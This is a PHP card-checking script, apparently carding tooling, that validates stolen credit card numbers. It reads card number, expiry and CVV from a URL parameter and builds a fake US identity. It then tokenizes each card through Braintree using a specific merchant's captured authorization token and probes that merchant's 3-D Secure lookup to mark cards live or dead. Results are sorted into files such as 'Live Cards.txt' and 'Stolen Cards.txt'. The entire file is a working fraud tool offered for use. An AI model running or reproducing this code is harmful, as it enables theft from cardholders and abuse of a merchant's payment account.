<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mon = multiexplode(array(":", "|", ""), $lista)[1];
$year = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}
function saveCCN($cc) {
$file = dirname(FILE) . "/CCN Lives.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveLive($cc) {
$file = dirname(FILE) . "/Live Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveCVV($cc) {
$file = dirname(FILE) . "/CVV Lives.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveStolenLives($cc) {
$file = dirname(FILE) . "/Stolen Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function savePickupLives($cc) {
$file = dirname(FILE) . "/Pickup Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveLostLives($cc) {
$file = dirname(FILE) . "/Lost Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveZipLives($cc) {
$file = dirname(FILE) . "/Incorrect Zip Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveInsufficientLives($cc) {
$file = dirname(FILE) . "/Insufficient Fund Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp);}
/////////////////////////////////////BIN LOOKUP START////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("randluda");
$last = str_shuffle("valu");
$first1 = str_shuffle("nostalzik98125");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
//----------------------------------------------------------------------------------------------------------------------//
/*function nosproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = nosproxys();
$ip = multiexplode(array(":", "|", ""), $poxySocks4)[0];
echo '<span class="text text-primary">「 IP: '.$ip.' 」</span> -> </span>';
*/


////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: payments.braintree-api.com',
'accept: */*',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDQ5OTIwMTksImp0aSI6IjcyNmU3NzYwLWRhZGItNDkyNS04ZWQ1LTU2NTgwZTQ0MmJiZiIsInN1YiI6Imp2Nnk0OXR3OHI2dHBwa3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imp2Nnk0OXR3OHI2dHBwa3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.hOBOyuvffwGBDujds4rxiuif_Nb1TkKCVUgM2EVDh83vrrpXf6h4YSdO4j_w28ppzIJhIsWPI2gRiVS-oPExDQ',
'braintree-version: 2018-05-10',
'content-type: application/json',
'origin: https://assets.braintreegateway.com',
'referer: https://assets.braintreegateway.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"ceb7d407-edd5-4e8d-bd9c-a832171fbcd5"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mon.'","expirationYear":"'.$year.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');


$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"token":"','"')));
//echo $result;


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/jv6y49tw8r6tppkw/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: api.braintreegateway.com',
'Origin: https://app.ethermailer.com',
'Referer: https://app.ethermailer.com/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: cross-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":10,"braintreeLibraryVersion":"braintree/web/3.36.0","_meta":{"merchantAppId":"app.ethermailer.com","platform":"web","sdkVersion":"3.36.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"ceb7d407-edd5-4e8d-bd9c-a832171fbcd5"},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDQ5OTIwMTksImp0aSI6IjcyNmU3NzYwLWRhZGItNDkyNS04ZWQ1LTU2NTgwZTQ0MmJiZiIsInN1YiI6Imp2Nnk0OXR3OHI2dHBwa3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imp2Nnk0OXR3OHI2dHBwa3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.hOBOyuvffwGBDujds4rxiuif_Nb1TkKCVUgM2EVDh83vrrpXf6h4YSdO4j_w28ppzIJhIsWPI2gRiVS-oPExDQ"}');


$result = curl_exec($ch);
$msg = trim(strip_tags(getStr($result,'"message": "','"')));
//echo $result;



if(strpos($result, 'authenticate_attempt_successful')){saveCVV ("Live CVV -> $cc|$mon|$year|$cvv | ");
    echo '<span class="badge badge-success">#Aprovada </span></br> <span class="badge badge-success">🐱‍👤</span> <span class="badge badge-success"> CC Details </span> <span class="badge badge-success">🐱‍👤</span></br> <span class="badge badge-success">#NON-VBV CARD</span></br> <span class="badge badge-green">CC = '.$cc.'</span></br></b><span class="badge badge-green">Exp = '.$mon.'/'.$year.'</span></br><span class="badge badge-green">CVC = '.$cvv.'</span></br><span class="badge badge-green">Code = '.$result.' </span></br></br><span class="badge badge-blue">🐱‍👤</span> <span class="badge badge-blue"> Cards Details </span> <span class="badge badge-blue">🐱‍👤</span></br><span class="badge badge-blue">Bank = '.$bank.'</span></br><span class="badge badge-blue">Type = '.$type.'</span></br><span class="badge badge-blue">Scheme = '.$scheme.'</span></br><span class="badge badge-blue">Brand = '.$brand.'</span></br><span class="badge badge-blue">Currency = '.$currency.'</span></br><span class="badge badge-blue">Zipcode = '.$zip.'</span></br><span class="badge badge-blue">City = '.$city.'</span></br><span class="badge badge-blue">State = '.$state.'</span></br><span class="badge badge-blue">Country = '.$name.' '.$emoji.'</span></br></br><span class="badge badge-yellow">🐱‍👤</span>  <span class="badge badge-yellow">🐱‍👤</span></br><span class="badge badge-yellow">N0stalzik"</span></br><span class="badge badge-yellow">Group = @ghett000</span></br><span class="badge badge-yellow"></span></br></br></br></br>';
}
elseif (strpos($result, "lookup_enrolled" )) {saveCCN ("Live CCN -> $cc|$mon|$year|$cvv | ");
    echo '<span class="badge badge-success">#Reprovada </span></br> <span class="badge badge-success">🐱‍👤</span> <span class="badge badge-success"> CC Details </span> <span class="badge badge-success">🐱‍👤</span></br> <span class="badge badge-success">#VBV-BIN</span></br> <span class="badge badge-green">CC = '.$cc.'</span></br></b><span class="badge badge-green">Exp = '.$mon.'/'.$year.'</span></br><span class="badge badge-green">CVC = '.$cvv.'</span></br><span class="badge badge-green">Code = '.$result.' </span></br></br><span class="badge badge-blue">🐱‍👤</span> <span class="badge badge-blue"> Cards Details </span> <span class="badge badge-blue">🐱‍👤</span></br><span class="badge badge-blue">Bank = '.$bank.'</span></br><span class="badge badge-blue">Type = '.$type.'</span></br><span class="badge badge-blue">Scheme = '.$scheme.'</span></br><span class="badge badge-blue">Brand = '.$brand.'</span></br><span class="badge badge-blue">Currency = '.$currency.'</span></br><span class="badge badge-blue">Zipcode = '.$zip.'</span></br><span class="badge badge-blue">City = '.$city.'</span></br><span class="badge badge-blue">State = '.$state.'</span></br><span class="badge badge-blue">Country = '.$name.' '.$emoji.'</span></br></br><span class="badge badge-yellow">Group = @ghett000</span></br><span class="badge badge-yellow"></span></br></br></br></br>';
}
else {
    echo '<span class="badge badge-red">#Reprovada </span></br> <span class="badge badge-red">🐱‍👤</span> <span class="badge badge-red"> CC Details </span> <span class="badge badge-red">🐱‍👤</span></br> <span class="badge badge-red">#Dead Card</span></br> <span class="badge badge-red">CC = '.$cc.'</span></br></b><span class="badge badge-red">Exp = '.$mon.'/'.$year.'</span></br><span class="badge badge-red">CVC = '.$cvv.'</span></br><span class="badge badge-red">Code = '.$result.' </br></br><span class="badge badge-blue">🐱‍👤</span> <span class="badge badge-blue"> Cards Details </span> <span class="badge badge-blue">🐱‍👤</span></br><span class="badge badge-blue">Bank = '.$bank.'</span></br><span class="badge badge-blue">Type = '.$type.'</span></br><span class="badge badge-blue">Scheme = '.$scheme.'</span></br><span class="badge badge-blue">Brand = '.$brand.'</span></br><span class="badge badge-blue">Currency = '.$currency.'</span></br><span class="badge badge-blue">Zipcode = '.$zip.'</span></br><span class="badge badge-blue">City = '.$city.'</span></br><span class="badge badge-blue">State = '.$state.'</span></br><span class="badge badge-blue">Country = '.$name.' '.$emoji.'</span></br></br><span class="badge badge-yellow">Group = @ghett000</span></br><span class="badge badge-yellow"></span></br></br></br></br>';
}
curl_close($ch);
ob_flush();
?>
